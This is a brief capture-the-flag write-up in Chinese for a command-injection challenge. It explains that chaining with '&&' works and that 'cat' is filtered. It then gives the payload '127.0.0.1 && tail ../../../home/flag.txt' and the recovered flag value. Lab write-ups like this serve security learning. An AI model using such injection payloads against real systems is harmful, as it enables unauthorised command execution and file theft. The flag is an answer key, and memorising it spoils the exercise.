# Command_Execution

> 命令注入

## 思路分析

> 直接用&&字符拼接是可以执行命令的,然后一层层的查找flag文件,发现文件位于/home/flag.txt,用cat读取被过滤,用tail读取获取flag

## payload

> 127.0.0.1 && tail ../../../home/flag.txt

## flag

> cyberpeace{a84dd895483169d57010b67ea611db30}